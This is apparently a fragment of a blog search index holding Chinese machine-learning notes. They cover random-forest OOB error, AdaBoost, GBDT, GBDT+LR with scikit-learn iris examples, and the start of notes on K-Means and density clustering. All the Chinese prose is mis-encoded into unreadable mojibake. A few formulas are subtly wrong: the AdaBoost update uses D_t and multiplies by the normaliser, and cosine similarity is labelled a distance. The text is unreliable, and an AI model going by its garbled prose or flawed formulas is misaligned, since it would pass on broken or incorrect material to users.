å–å‡ºè¯¥æ ·æœ¬çš„OOBé¢„æµ‹å™¨é›†åˆ è®©è¿™ä¸ªé¢„æµ‹å™¨é›†åˆä¸­çš„æ¯æ£µå†³ç­–æ ‘å¯¹xè¿›è¡Œé¢„æµ‹ é€šè¿‡æŠ•ç¥¨ï¼ˆå¯¹äºåˆ†ç±»é—®é¢˜ï¼‰æˆ–å¹³å‡ï¼ˆå¯¹äºå›å½’é—®é¢˜ï¼‰çš„æ–¹å¼ï¼Œæ±‡æ€»è¿™äº›æ ‘çš„é¢„æµ‹ç»“æœï¼Œå¾—åˆ°æ ·æœ¬ $ (x,y) $ çš„æœ€ç»ˆOOBé¢„æµ‹å€¼ $ \\hat y_{OOB} $ è®¡ç®—æ‰€æœ‰æ ·æœ¬çš„OOBè¯¯å·® åˆ†ç±»é—®é¢˜ï¼ˆåˆ†ç±»é”™è¯¯ç‡ï¼‰ï¼š $$OOB\\_Error = \\displaystyle{\\frac{1}{N}\\sum^N_{i=1}I(y_i\\neq \\hat y_{OOB_i})} $$ ï¼Œå…¶ä¸­ $ I(j) $ ä¸ºæŒ‡ç¤ºå‡½æ•°ï¼Œè‹¥ $ j $ ä¸º $ True $ åˆ™è¾“å‡º $ 1 $ ï¼› $ j $ ä¸º $ False $ åˆ™è¾“å‡º $ 0 $ å›å½’é—®é¢˜ï¼ˆå‡æ–¹è¯¯å·®ï¼‰ï¼š $$ OOB\\_Error = \\displaystyle{\\frac{1}{N}\\sum^N_{i=1}(y_i-\\hat y_{OOB_i})^2} $$ è¯¥è¯¯å·®ä½œä¸ºæ¨¡å‹æ³›åŒ–èƒ½åŠ›çš„æ— åä¼°è®¡ï¼Œç”¨äºè¯„ä¼°æ¨¡å‹æ€§èƒ½ï¼›æŒ‡å¯¼æ¨¡å‹è¶…å‚æ•°çš„é€‰æ‹©ï¼Œæ— éœ€é¢å¤–éªŒè¯é›†ï¼›ç¡®å®šæœ€ä¼˜çš„æ ‘æ•°é‡ï¼›è¿›è¡Œæ¨¡å‹è¯Šæ–­ï¼›æŒ‡å¯¼ç‰¹å¾é€‰æ‹©ï¼›ä½œä¸ºæ—©æœŸåœæ­¢å‡†åˆ™ ç¬¬ä¸‰æ­¥ï¼šå…¶ä»–åº”ç”¨ ç‰¹å¾é‡è¦æ€§è¯„ä¼°ï¼šå¦‚æœä¸€ä¸ªç‰¹å¾å¾ˆé‡è¦ï¼Œé‚£ä¹ˆéšæœºæ‰“ä¹±å…¶å€¼ä¼šæ˜¾è‘—é™ä½æ¨¡å‹æ€§èƒ½ å¯¹äºæ¯æ£µæ ‘ $ t_i $ ï¼Œè®¡ç®—è¢‹å¤–æ ·æœ¬ $ OOB_i $ çš„è¯¯å·®ï¼Œè®°ä½œ $ Err_{OOB_i} $ éšæœºæ‰“ä¹±ï¼ˆæ’åºï¼‰ $ OOB_i $ ä¸­çš„æŸä¸ªç‰¹å¾jçš„å€¼ ç”¨æ‰“ä¹±åçš„ $ OOB_i $ å†æ¬¡è®¡ç®— $ t_i $ çš„é¢„æµ‹è¯¯å·®ï¼Œè®°ä½œ $ Err_{perm_i} $ å¯¹äºç‰¹å¾ $ j $ ï¼Œå®ƒåœ¨æ‰€æœ‰æ ‘ä¸Šçš„é‡è¦æ€§å¾—åˆ†å¯ä»¥è®¡ç®—ä¸ºï¼š $$ \\displaystyle{Importance_j = \\frac{1}{T}\\sum_{i=1}^T(Err_{perm_i}-Err_{OOB_i}) }$$ ï¼Œè¯¥å€¼è¡¡é‡äº†ç”±äºç‰¹å¾jè¢«æ‰“ä¹±å¯¼è‡´çš„æ¨¡å‹æ€§èƒ½ä¸‹é™ç¨‹åº¦ã€‚ä¸‹é™å¾—è¶Šå¤šï¼Œè¯¥ç‰¹å¾è¶Šé‡è¦ å°†æ‰€æœ‰ç‰¹å¾å¾—é‡è¦æ€§å¾—åˆ†è¿›è¡Œå½’ä¸€åŒ–ï¼Œä»¥ä¾¿æ¯”è¾ƒ AdaBoostï¼ˆAdaptive Boostingï¼Œè‡ªé€‚åº”å¢å¼ºï¼‰ æ€æƒ³ï¼š å¼±åˆ†ç±»å™¨ï¼šAdaBoosté€šè¿‡å°†å¤šä¸ªæ¯”è¾ƒç®€å•çš„ã€æ€§èƒ½è¾ƒå¼±çš„åŸºå­¦ä¹ å™¨ï¼ˆâ€œå¼±åˆ†ç±»å™¨â€ï¼‰ç»„åˆèµ·æ¥ï¼Œæ„å»ºå‡ºå¼ºå¤§çš„ã€æ€§èƒ½ä¼˜å¼‚çš„â€œå¼ºåˆ†ç±»å™¨â€ã€‚é€šå¸¸ä¸€ä¸ªå¼±åˆ†ç±»å™¨ä¸ºæ·±åº¦ä¸º 1 çš„äºŒåˆ†å†³ç­–æ ‘ï¼ˆå†³ç­–æ ‘æ¡©ï¼‰ã€‚ â€œè‡ªé€‚åº”â€ï¼šåœ¨æ¯ä¸€è½®è®­ç»ƒä¸­ï¼Œå®ƒéƒ½ä¼šæ ¹æ®å‰ä¸€è½®çš„åˆ†ç±»ç»“æœã€è‡ªåŠ¨è°ƒæ•´è®­ç»ƒæ•°æ®çš„æƒé‡åˆ†å¸ƒï¼Œä½¿å¾—ç®—æ³•åœ¨åç»­è½®æ¬¡ä¸­æ›´åŠ å…³æ³¨é‚£äº›è¢«å‰ä¸€ä¸ªå¼±åˆ†ç±»å™¨åˆ†é”™çš„æ ·æœ¬ï¼ˆæé«˜åˆ†é”™æ ·æœ¬åœ¨æŸå¤±å‡½æ•°ä¸­çš„æƒé‡ï¼‰ã€‚è¿™æ ·ï¼Œæ¯ä¸ªæ–°ç”Ÿæˆçš„å¼±åˆ†ç±»å™¨éƒ½æ˜¯åœ¨â€œå¼¥è¡¥â€å‰ä¸€ä¸ªåˆ†ç±»å™¨çš„ä¸è¶³ã€‚ é‡ç‚¹å…³æ³¨é”™è¯¯ï¼šåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­æ›´åŠ å…³æ³¨é‚£äº›è¢«å‰ä¸€ä¸ªåˆ†ç±»å™¨åˆ†é”™çš„æ ·æœ¬ã€‚é€šè¿‡ä¸æ–­è°ƒæ•´æ ·æœ¬çš„æƒé‡å®ç° ä¸“å®¶æŠ•ç¥¨ï¼šæ¯ä¸ªå¼±åˆ†ç±»å™¨çš„æ°´å¹³æœ‰é«˜æœ‰ä½ã€‚æœ€ç»ˆå†³ç­–æ—¶æ€§èƒ½å¥½çš„å¼±åˆ†ç±»å™¨åŸæœ‰æ›´å¤§çš„æŠ•ç¥¨æƒé‡ ç®—æ³•æµç¨‹ï¼š åˆå§‹åŒ–ï¼šä¸ºæ¯ä¸ªæ ·æœ¬åˆ†é…ç›¸åŒçš„åˆå§‹æƒé‡ï¼š$$\\displaystyle{w_i^{(0)}=\\frac{1}{m},i \\in \\{1,2,\\dots m\\}}$$ è®­ç»ƒTä¸ªå¼±åˆ†ç±»å™¨ï¼š $$G_t(x),t \\in \\{1,2,\\dots T\\}$$ ä½¿ç”¨å½“å‰çš„æ ·æœ¬æƒé‡åˆ†å¸ƒ $w_t$ è®­ç»ƒä¸€ä¸ªäºŒåˆ†ç±»å¼±åˆ†ç±»å™¨ $G_t(x)$ è®¡ç®—å½“å‰å¼±åˆ†ç±»å™¨çš„åŠ æƒé”™è¯¯ç‡ $$\\displaystyle{\\epsilon_t=\\sum_{i=1}^mw_i^{(t)}Â·I(G_t(x_i) \\neq y_i)} \\le 0.5$$ï¼Œ$$ å…¶ä¸­, I(j) = \\begin{cases} 1,\u0026 j=True \\\\ 0,\u0026 j=False \\\\ \\end{cases} $$ è®¡ç®—å½“å‰å¼±åˆ†ç±»å™¨çš„æƒé‡ï¼š $\\alpha_t = \\displaystyle{\\frac{1}{2}ln(\\frac{1-\\epsilon_t}{\\epsilon_t})}$ï¼Œ $$ \\begin{cases} \u0026\\alpha \\rightarrow +\\infty , \u0026\\epsilon=0 \\\\ \u0026\\alpha = 0 , \u0026\\epsilon=0.5 \\\\ \u0026\\alpha \u003e 0 , \u0026\\epsilon \u003c 0.5, \\ ä¸”\\epsilon_tè¶Šå°ï¼Œ\\alpha_tè¶Šå¤§ \\end{cases} $$ æ›´æ–°æ ·æœ¬æƒé‡ï¼š $$ \\begin{array} ww_i^{t+1}=w_i^{(t)}\\exp(-\\alpha_tÂ·y_iÂ·D_t(x_i))Â·Z_t \\\\ y_iG_t(x_i)=\\begin{cases} +1,x_iåˆ†ç±»æ­£ç¡® \\\\ -1,x_iåˆ†ç±»é”™è¯¯ \\\\ \\end{cases} \\\\ Z_tä¸ºè§„èŒƒåŒ–å› å­ï¼Œä¸ºå¸¸æ•°ï¼Œç›®çš„æ˜¯è®©æ‰€æœ‰æƒé‡åŠ èµ·æ¥ç­‰äº1 \\end{array} $$ ç»„åˆæ‰€æœ‰åˆ†ç±»å™¨ ç»è¿‡Tè½®è¿­ä»£ï¼Œå¾—åˆ°Tä¸ªå¼±åˆ†ç±»å™¨åŠå…¶æƒé‡ $$\\{G_t,\\alpha_t\\}, t \\in \\{1,2\\dots T\\}$$ æœ€ç»ˆçš„å¼ºåˆ†ç±»å™¨F(x)æ˜¯æ‰€æœ‰å¼±åˆ†ç±»å™¨çš„åŠ æƒæŠ•ç¥¨ç»“æœï¼š$$F(x)=sign({\\displaystyle{\\sum_{t=1}^T\\alpha_tG_t(x)}})$$ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from sklearn.ensemble import AdaBoostClassifier from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.metrics import accuracy_score import matplotlib.pyplot as plt import numpy as np iris = load_iris() X,y = iris.data[:,2:4],iris.target X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) abc = AdaBoostClassifier( n_estimators=50, learning_rate=1, random_state=42 ) abc.fit(X_train,y_train) print(abc.score(X_test,y_test)) 1.0 GBDTï¼ˆæ¢¯åº¦æå‡å†³ç­–æ ‘ï¼‰ Boostingæ€æƒ³ + å†³ç­–æ ‘ + æ¢¯åº¦ä¸‹é™æ€æƒ³ æ€æƒ³ï¼š Gradientï¼šé€šè¿‡æ¢¯åº¦ä¸‹é™æ¥æœ€å°åŒ–æŸå¤±å‡½æ•°ã€‚æ¯ä¸€æ£µæ ‘çš„æ–°å»ºéƒ½æ˜¯ä¸ºäº†å­¦ä¹ ä¹‹å‰æ‰€æœ‰æ ‘ç»„åˆçš„é¢„æµ‹ç»“æœçš„æ®‹å·® Boostingï¼šä¸²è¡Œé›†æˆæ–¹æ³•ã€‚åŸºå­¦ä¹ å™¨ä¸€ä¸ªä¸ªä¾æ¬¡è®­ç»ƒï¼Œæ¯ä¸€éƒ½è¯•å›¾ä¿®æ­£å‰ä¸€ä¸ªçš„é”™è¯¯ã€‚ Decision Treeï¼šä½¿ç”¨CARTå›å½’æ ‘ä½œä¸ºå¼±å­¦ä¹ å™¨ï¼Œä¸è®ºæ˜¯åˆ†ç±»ä»»åŠ¡è¿˜æ˜¯å›å½’ä»»åŠ¡ ç®—æ³•æµç¨‹ï¼š ç¬¬ä¸€æ­¥ï¼šæ¨¡å‹åˆå§‹åŒ– ç”¨ä¸€ä¸ªå¸¸æ•°æ¥åˆå§‹åŒ–ä¸€ä¸ªéå¸¸ç®€å•çš„æ¨¡å‹ï¼Œé€šå¸¸å–æŸå¤±å‡½æ•°æœ€å°çš„å¸¸æ•°å€¼ã€‚å¯¹äºå¹³æ–¹è¯¯å·®æŸå¤±ï¼Œè¿™ä¸ªå€¼å°±æ˜¯ç›®æ ‡å€¼çš„å‡å€¼ã€‚ $$F^{(0)}(x) = \\underset{\\gamma}{argmin}\\displaystyle{\\sum_{i=1}^nL(y_i,\\gamma)=\\frac{1}{n}\\sum_{i=1}^ny_i}$$ ç¬¬äºŒæ­¥ï¼šå¾ªç¯è¿­ä»£ è®¡ç®—ä¼ªæ®‹å·®ï¼šå¯¹äºæ¯æ¡æ ·æœ¬1-nï¼Œè®¡ç®—å½“å‰æ¨¡å‹çš„è´Ÿæ¢¯åº¦: $$\\gamma_i^{(m)}=-\\displaystyle{[\\frac{\\partial L(y_i,F(x_i))}{\\partial F(x_i)}]|_{F(x)=F^{(m-1)}(x)}}$$ å¯¹äºå¹³æ–¹è¯¯å·®æŸå¤±ï¼š$$L=\\displaystyle{\\frac{1}{2}(y_i-F(x_i))^2}$$ã€‚æœ‰ï¼š$$\\gamma_i^{(m)}=y_i-F^{(m-1)}(x_i)$$ ä½¿ç”¨è®­ç»ƒæ•°æ®$$(x_i,\\gamma_i^{(m)})_{i=1}^{n}$$ è®­ç»ƒä¸€é¢—æ–°çš„CARTå›å½’æ ‘ $h^{(m)}(x)$ã€‚è¿™æ£µæ ‘çš„å¶èŠ‚ç‚¹åŒºåŸŸè®°ä¸º $R_j^{(m)}$ï¼Œå…¶ä¸­ $j=1,2\\dots J^{(m)} ,\\ J^{(m)}$æ˜¯ç¬¬ $m$ æ£µæ ‘çš„å¶å­èŠ‚ç‚¹æ•° ä¸ºæ ‘çš„æ¯ä¸ªå¶å­èŠ‚ç‚¹è®¡ç®—æœ€ä½³è¾“å‡ºå€¼ï¼šå¯¹äºç¬¬mæ£µæ ‘çš„æ¯ä¸€ä¸ªå¶å­èŠ‚ç‚¹åŒºåŸŸ$R_j^{(m)}$ã€‚è®¡ç®—ä¸€ä¸ªæœ€ä½³è¾“å‡ºå€¼ $\\gamma_j^{(m)}$ ã€‚è¿™ä¸ªå€¼æ˜¯è¿™ä¸ªå¶å­èŠ‚ç‚¹åŒºåŸŸå†…ï¼Œèƒ½ä½¿æŸå¤±å‡½æ•°æœ€å°åŒ–çš„å€¼ï¼š$$\\displaystyle{\\gamma_j^{(m)}=\\underset{\\gamma}{argmin}\\sum_{x_i \\in R_j^{(m)}}L(y_i,F^{(m-1)}(x_i)+\\gamma)}$$ã€‚å¯¹äºå¹³æ–¹è¯¯å·®æŸå¤±ï¼Œè¿™ä¸ªå€¼å°±æ˜¯è½å…¥è¿™ä¸ªå¶èŠ‚ç‚¹çš„æ‰€æœ‰æ ·æœ¬çš„ä¼ªæ®‹å·®çš„å‡å€¼ã€‚ æ›´æ–°æ¨¡å‹ã€‚å°†æ–°æ ‘åŠ å…¥åˆ°å½“å‰æ¨¡å‹ä¸­ï¼Œè¿›è¡Œæ›´æ–°ï¼š $$\\displaystyle{F^{(m)}(x) = F^{(m-1)}(x) + \\nu Â· \\sum_{j=1}^{J^{(m)}}\\gamma_{j}^{(m)}I(x \\in R_{j}^{(m)})}$$ï¼Œå…¶ä¸­$\\nu$ä¸ºå­¦ä¹ ç‡ å¾—åˆ°æœ€ç»ˆæ¨¡å‹ï¼š$$\\displaystyle{F^{(M)}(x) = F^{(0)}(x) + \\nu Â· \\sum_{m=1}^{M}h^{(m)}(x)}$$ GBDT+LRæ¶æ„ æ€æƒ³ï¼š GBDTè´Ÿè´£ï¼šè‡ªåŠ¨è¿›è¡Œç‰¹å¾ç»„åˆå’Œè½¬æ¢ã€‚ å®ƒå°†åŸå§‹çš„ç‰¹å¾å‘é‡è‡ªåŠ¨è½¬åŒ–ä¸ºä¸€ä¸ªæ–°çš„ã€æ›´é«˜ç»´çš„ã€ä¸”å…·æœ‰å¼ºè¡¨å¾èƒ½åŠ›çš„ç¨€ç–ç‰¹å¾å‘é‡ã€‚ LRè´Ÿè´£ï¼šåœ¨æ–°ç”Ÿæˆçš„ç‰¹å¾å‘é‡ä¸Šè¿›è¡Œé«˜æ•ˆè®­ç»ƒã€‚ LRæ¨¡å‹ç®€å•ã€å¯è§£é‡Šæ€§å¼ºï¼Œå¹¶ä¸”éå¸¸é€‚åˆå¤„ç†å¤§è§„æ¨¡ç¨€ç–ç‰¹å¾ã€‚ æ¶æ„è¯¦è§£ è®­ç»ƒGBDTæ¨¡å‹ï¼šè®­ç»ƒä¸€ä¸ªå«æœ‰mä¸ªåŸºå­¦ä¹ å™¨ï¼ˆå†³ç­–æ ‘ï¼‰ï¼Œæ¯ä¸ªåŸºå­¦ä¹ å™¨æœ‰nä¸ªå¶å­èŠ‚ç‚¹ï¼ˆnåˆ†ç±»ï¼‰ã€‚è¾“å…¥rç»´æ ·æœ¬xã€‚xåˆ†åˆ«å–‚ç»™mä¸ªåŸºå­¦ä¹ å™¨ï¼Œæœ€ç»ˆxä¸€å®šä¼šè½åˆ°æ¯ä¸ªåŸºå­¦ä¹ å™¨çš„æŸä¸ªå¶å­èŠ‚ç‚¹ä¸Šã€‚åˆ›å»ºä¸€ä¸ªm*nç»´å‘é‡Xï¼Œä¾æ¬¡å¯¹åº”æ¯ä¸ªå­¦ä¹ å™¨çš„å¶å­èŠ‚ç‚¹ã€‚è‹¥xè½åˆ°æŸä¸ªå¶å­èŠ‚ç‚¹ï¼Œåˆ™å¯¹åº”Xçš„ä½ç½®æ ‡ä¸º1ï¼Œæœªè½å…¥çš„ä½ç½®æ ‡ä¸º0ã€‚è‡³æ­¤ï¼Œrç»´çš„xå‘é‡è½¬ä¸ºmnç»´çš„Xå‘é‡ã€‚ å°†ç¨€ç–æ ·æœ¬Xå–‚ç»™LRæ¨¡å‹è¿›è¡Œè®­ç»ƒ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from sklearn.ensemble import AdaBoostClassifier from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.metrics import accuracy_score from sklearn.pipeline import Pipeline from sklearn.preprocessing import StandardScaler import matplotlib.pyplot as plt import numpy as np from sklearn.ensemble import GradientBoostingClassifier iris = load_iris() X,y = iris.data[:,:],iris.target X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) pip = Pipeline([ (\u0026#39;scl\u0026#39;,StandardScaler()), (\u0026#39;gbc\u0026#39;,GradientBoostingClassifier( n_estimators=100, learning_rate=0.1, max_depth=3, random_state=42 )) ]) pip.fit(X_train,y_train) pip.score(X_test,y_test),pip[\u0026#39;gbc\u0026#39;].feature_importances_ (1.0, array([0.00135739, 0.01465991, 0.66567719, 0.31830551])) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 # GBDT + LR from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.ensemble import GradientBoostingClassifier from sklearn.linear_model import LogisticRegression from sklearn.preprocessing import OneHotEncoder class GradientBoostingClassifierWithLogisticRegression(object): def __init__(self,X_train,X_test): self.gbdt_model = None self.lr_model = None self.gbdt_encoder = None self.X_train_leafs = None self.X_test_leafs = None self.X_encoded = None self.train_model(X_train,X_test) def train_gbdt_model(self,X_train,y_train): self.gbdt_model=GradientBoostingClassifier( n_estimators=5, max_depth=2, max_features=0.5 ).fit(X_train,y_train) def train_lr_model(self,X_train,y_train): self.lr_model=LogisticRegression().fit(X_train,y_train) def train_model(self,X_train,y_train): self.train_gbdt_model(X_train,y_train) self.X_train_leafs = self.gbdt_model.apply(X_train)[:,:,0] # ç¬¬0ä¸ªç±»åˆ«åˆ†åˆ«è½åˆ°äº†å“ªæ£µæ ‘ä¸Š self.gbdt_encoder = OneHotEncoder(sparse_output=False) self.X_encoded = self.gbdt_encoder.fit_transform(self.X_train_leafs) self.train_lr_model(self.X_encoded,y_train) def predict(self,X_test,y_test): X_test_leafs = self.gbdt_model.apply(X_test)[:,:,0] X_test_leafs_enconded = self.gbdt_encoder.transform(X_test_leafs) return self.lr_model.predict(X_test_leafs_enconded),self.lr_model.score(X_test_leafs_enconded,y_test) if __name__==\u0026#34;__main__\u0026#34;: iris = load_iris() X,y = iris.data[:,:],iris.target==2 X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) fdbtlr=GradientBoostingClassifierWithLogisticRegression(X_train,y_train) print(fdbtlr.predict(X_train,y_train)) print(fdbtlr.predict(X_test,y_test)) (array([False, False, False, False, False, True, False, False, False, False, True, False, False, False, False, False, True, True, False, True, False, True, False, False, True, False, False, False, False, False, True, False, False, False, False, False, False, True, False, False, True, False, True, True, False, False, True, False, False, False, True, False, False, False, True, False, True, False, False, True, False, True, True, True, True, False, False, False, True, True, False, False, False, False, True, False, True, True, False, False, False, True, False, True, False, True, False, True, False, False, False, False, False, False, False, False, True, True, False, False, True, True, False, True, False, False, True, True, False, True, False, False, True, True, False, False, True, False, False, True]), 0.975) (array([False, False, True, False, False, False, False, True, False, False, True, False, False, False, False, False, True, False, False, True, False, True, False, True, True, True, True, True, False, False]), 1.0) ","date":"2025-12-02T20:30:43+08:00","image":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E9%9B%86%E6%88%90%E5%AD%A6%E4%B9%A0/output_3_1_hu_266086bdc7c4d681.png","permalink":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E9%9B%86%E6%88%90%E5%AD%A6%E4%B9%A0/","title":"æœºå™¨å­¦ä¹ -é›†æˆå­¦ä¹ "},{"content":" ç›®å½• Kå‡å€¼èšç±»ï¼ˆK-Means Clusteringï¼‰ å±‚æ¬¡èšç±»ï¼ˆHierarchical Clusteringï¼‰ å¯†åº¦èšç±» é«˜æ–¯æ··åˆæ¨¡å‹ï¼ˆGMMæ¨¡å‹ï¼‰ å•ä¸ªé«˜æ–¯åˆ†å¸ƒï¼ˆGMï¼‰ æ··åˆé«˜æ–¯æ¨¡å‹ï¼ˆGMMï¼‰ EMç®—æ³• GMMæµç¨‹ é™ç»´ é™ç»´æ–¹æ³•ï¼š PCAé™ç»´ æ— ç›‘ç£å­¦ä¹ ï¼ˆUnsupervised Learningï¼‰ èšç±»æ˜¯ä¸€ç§æ— ç›‘ç£çš„æœºå™¨å­¦ä¹ ä»»åŠ¡ï¼Œå®ƒå¯ä»¥è‡ªåŠ¨å°†æ•°æ®åˆ’åˆ†æˆç±»ï¼ˆClusterï¼‰ Kå‡å€¼èšç±»ï¼ˆK-Means Clusteringï¼‰ å¯¹äºæ²¡æœ‰æ ‡ç­¾çš„æ•°æ®æ ·æœ¬ $X$ ï¼Œæ ¹æ® $X$ çš„ç›¸ä¼¼åº¦åˆ’åˆ†ä¸º $k$ ç±» K-Meansä¸€èˆ¬è¿‡ç¨‹ï¼š åˆå§‹åŒ–ï¼šæŒ‡å®šä¸­å¿ƒæ•°ï¼ˆç°‡æ•°ï¼‰ $k$ ä»¥åŠ $k$ ä¸ªç°‡ä¸­å¿ƒï¼ˆ $ \\mu_1,\\mu_2\\dots \\mu_k $ ï¼Œç»å…¸K-Meansä¸­éšæœºé€‰æ‹©ä¸­å¿ƒï¼‰ è¿­ä»£ï¼š åˆ†é…æ­¥ï¼šå¯¹æ¯ä¸ªæ ·æœ¬ $$ x_i,i \\in \\{ 1,2\\dots m \\},$$ è®¡ç®— $ x_i $ä¸ $ \\mu_1,\\mu_2\\dots \\mu_k $ çš„è·ç¦»ï¼Œå¹¶å°† $ x_i $ åˆ†é…ç»™ç°‡ä¸­å¿ƒè·ç¦»å…¶æœ€è¿‘çš„ç°‡ï¼š$$\\displaystyle{x_i \\rightarrow Cluster_{ \\underset{j}{argmin}||x_i-\\mu_j||^2}}$$ æ›´æ–°æ­¥ï¼šæ›´æ–°ç°‡ä¸­å¿ƒï¼š$$\\displaystyle{\\mu_j=\\frac{1}{|N_j|}\\sum_{x_i\\in Cluster_j}x_i}$$ è¿­ä»£è‡³ï¼š ç°‡ä¸­å¿ƒä¸å˜æˆ–å˜åŒ–å¹…åº¦å°äºé˜ˆå€¼ æ ·æœ¬ç‚¹çš„å½’å±ä¸å†å‘ç”Ÿå˜åŒ– è¿­ä»£æ¬¡æ•°è¾¾åˆ°æœ€å¤§ K-MeansæŸå¤±å‡½æ•°MSEï¼šæ¯ä¸ªç‚¹åˆ°ä¸­å¿ƒç‚¹çš„è·ç¦» $$\\displaystyle{J(\\mu_1,\\mu_2 \\dots \\mu_k) = \\frac{1}{2} \\sum^k_{j=1}\\sum^{N_j}_{i=1}(x_i-\\mu_j)^2}$$ $k$ çš„é€‰å–â€”â€”è‚˜éƒ¨æ³• ä¾æ¬¡é€‰å– $k\\in{1,2\\dots m}$ï¼Œè®¡ç®—æ•´ä½“çš„æŸå¤± æœ€ç»ˆé€‰å– $k_m$ ä½¿å¾—æ”¶ç›Šï¼š $$Gain=|Loss(k_m-1)-Loss(k_m)|-|Loss(k_m)-Loss(k_m+1)|$$ å–å¾—æœ€å¤§å€¼ã€‚å³$$\\displaystyle{k_m = \\underset{k}{\\operatorname{argmax}} |Loss(k-1)-Loss(k)|-|Loss(k)-Loss(k+1)|}$$ ç›¸ä¼¼åº¦â€”â€”ä»¥è·ç¦»å‡½æ•°è¡¡é‡ é—µå¯å¤«æ–¯åŸºè·ç¦»ï¼š$$\\displaystyle{d_p(x,y)=\\sqrt[p]{\\sum_{i=1}^n|x_n-y_n|^p}}$$ æ›¼å“ˆé¡¿è·ç¦»(p=1)ï¼š$$\\displaystyle{d_1(x,y)=\\sum_{i=1}^n|x_n-y_n|}$$ æ¬§å¼è·ç¦»(p=2)ï¼š$$\\displaystyle{d_2(x,y)=\\sqrt{(x-y)^T(x-y)}}$$ åˆ‡æ¯”é›ªå¤«è·ç¦»(p=$\\infty$)ï¼š$$\\displaystyle{d_\\infty(x,y)=\\max\\limits_{i\\in\\{1,2\\dots n\\}}|x_i-y_i|}$$ ä½™å¼¦è·ç¦»ï¼š$$\\displaystyle{d_{\\cos}(x,y)=\\frac{x^Ty}{||x||Â·||y||}} \\in [-1,1]$$ Jaccardç›¸ä¼¼ç³»æ•°ï¼š$$\\displaystyle{J(A,B) = \\frac{|A\\cap B|}{|A \\cup B|} = \\frac{|A\\cap B|}{|A|+|B|-|A\\cap B|}}$$ K-Meanså˜ç§ K-Mediodsï¼šè®¡ç®—æ–°çš„ç°‡ä¸­å¿ƒçš„æ—¶å€™ä¸å†é€‰æ‹©å‡å€¼ï¼Œè€Œé€‰æ‹©ä¸­ä½æ•°ã€‚æŠ—å™ªèƒ½åŠ›å¾—åˆ°åŠ å¼º äºŒåˆ†K-Meansï¼šåˆå¹¶ç°‡ä¸­å¿ƒç‚¹æ¯”è¾ƒè¿‘ï¼ŒMSEå¾ˆå°çš„ç°‡ï¼›åˆ‡åˆ†ç°‡ä¸­å¿ƒç‚¹æ¯”è¾ƒè¿œï¼ŒMSEæ¯”è¾ƒå¤§çš„ç°‡ã€‚é‡æ–°è¿›è¡ŒK-Meansèšç±» K-Means++ï¼šä½¿åˆå§‹åŒ–ç°‡ä¸­å¿ƒç¨å¾®è¿œä¸€ç‚¹ã€‚éšæœºé€‰æ‹©ç¬¬ä¸€ä¸ªä¸­å¿ƒç‚¹ï¼Œè®¡ç®—MSEï¼Œå°†MSEè½¬åŒ–ä¸ºæ¦‚ç‡è¿›è¡Œæ¦‚ç‡åŒ–é€‰æ‹©åˆå§‹ç°‡ä¸­å¿ƒç‚¹ Canopyèšç±»ï¼š ä¸€æ¬¡è¿­ä»£ï¼Œç»™å‡ºkçš„å€¼ä»¥åŠkä¸ªåˆå§‹ä¸­å¿ƒç‚¹ï¼ˆç„¶åè¿›è¡ŒK-Meansç®—æ³•ï¼‰ å±‚æ¬¡èšç±»ï¼ˆHierarchical Clusteringï¼‰ åˆ†è£‚æ³• æ€æƒ³ï¼šå°†æ‰€æœ‰æ ·æœ¬å½’ä¸ºä¸€ä¸ªç°‡ã€‚æ¯æ¬¡è¿­ä»£åœ¨ä¸€ä¸ªç°‡ä¸­æ‰¾åˆ°è·ç¦»æœ€è¿œçš„ä¸¤ä¸ªæ ·æœ¬ç‚¹ï¼Œå°†è¯¥ç°‡åˆ’åˆ†ä¸ºä¸¤ä¸ªå­ç°‡ã€‚ä¾æ¬¡ç±»æ¨ç›´åˆ°åˆ’åˆ†ä¸ºkä¸ªç°‡ å‡èšæ³• æ€æƒ³ï¼šå°†æ‰€æœ‰æ ·æœ¬ç‚¹çœ‹ä½œä¸€ä¸ªç‹¬ç«‹çš„ç°‡ã€‚æ¯æ¬¡è¿­ä»£æ‰¾åˆ°è·ç¦»æœ€å°çš„ä¸¤ä¸ªç°‡è¿›è¡Œåˆå¹¶ã€‚ å¯†åº¦èšç±» DB-SCANèšç±»ï¼ˆDensity_Based Spatial Clustering of Applications with Noiseï¼‰ ä¸å±‚æ¬¡èšç±»ä¸åŒï¼Œå®ƒå°†ç°‡å®šä¹‰ä¸ºå¯†åº¦ç›¸è¿çš„ç‚¹çš„æœ€å¤§é›†åˆï¼Œèƒ½å¤ŸæŠŠå…·æœ‰é«˜å¯†åº¦çš„åŒºåŸŸåˆ’åˆ†ä¸ºç°‡ï¼Œå¹¶å¯æœ‰æ•ˆåœ°å¯¹æŠ—å™ªå£° å¯†åº¦ç›¸è¿ ç›´æ¥å¯†åº¦å¯è¾¾ï¼ˆè‹¥å¯¹è±¡qçš„eé‚»åŸŸå†…è‡³å°‘æœ‰mä¸ªå¯¹è±¡ï¼ŒmæŒ‡å®šã€‚åˆ™qä¸ºæ ¸å¿ƒå¯¹è±¡ï¼‰ è‹¥ç»™å®šä¸€ä¸ªå¯¹è±¡é›†åˆDï¼Œå¦‚æœpåœ¨qçš„eé‚»åŸŸå†…ï¼Œè€Œqæ˜¯ä¸€ä¸ªæ ¸å¿ƒå¯¹è±¡ï¼Œåˆ™pä»qå‡ºå‘æ˜¯ç›´æ¥å¯†åº¦å¯è¾¾çš„ è‹¥qç›´æ¥å¯†åº¦å¯è¾¾rï¼Œrç›´æ¥å¯†åº¦å¯è¾¾pï¼Œåˆ™qç›´æ¥å¯†åº¦å¯è¾¾p 